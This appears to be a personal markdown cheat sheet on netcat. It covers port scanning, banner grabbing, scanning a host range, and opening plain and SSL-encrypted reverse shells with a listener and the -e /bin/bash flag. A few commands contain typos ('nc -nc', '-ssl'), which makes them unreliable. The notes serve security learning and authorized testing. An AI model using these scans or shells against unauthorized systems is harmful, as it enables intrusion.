## Netcat
Can be used for several thinks
- Port Scanning
- File Transfer
- Reverse Shells

### How to use
```bash
nc -h

l : Listening mode.
v : Verbose mode. Displays status messages in more detail.
n : Numeric-only IP address. No hostname resolution. DNS is not being used.
p : Port. Use to specify a particular port for listening.


nc -lvnp 1337
```

### Port Scanning
maybe slower than nmap, but can be used if nmap is not available

```sh
nc -nv -w 1 -z <target-ip> <port-range>

-nv # doesn't resolve hostnames
-w 1 # timeout after 1 second
-z # port scan (zero I/O mode, only scan for listening ports)
-u # UDP mode (unreliable) 
-vn # verbose and no DNS resolution

```
### Banner Grabbing

#### Netcat to use older HTTP Versions
```sh
nc -v <target-ip> 80
GET / HTTP/1.0

# with path
nc -v <target-ip> 80
GET /images HTTP/1.0
```

### Examples:

```bash
nc -nc -w 1 -z 192.234.1.1 1-1000

#scan more than one Host:
#1.
nmap 192.234.1.1/24 -sn -n -oG - | awk '/Up$/{print $2}' > ips.txt
#2.
while read ip; do nc -nv -w 1 -z $ip 80; done < ips.txt
```

### Reverse Shell
```sh
#Terminal Window 1
    nc -nvlp 1337 #listener
    
# Terminal Window 2
    nc -nv <target-ip> 1337 #connect to listener
    -e #execute command / standard is /bin/bash
```
#### Reverse Shell Encrypted
```sh
#Terminal Window 1
    nc -nvlp 1337 --ssl #listener encrypted
    
# Terminal Window 2
    nc -nv <target-ip> 1337 -ssl #connect to listener encrypted
```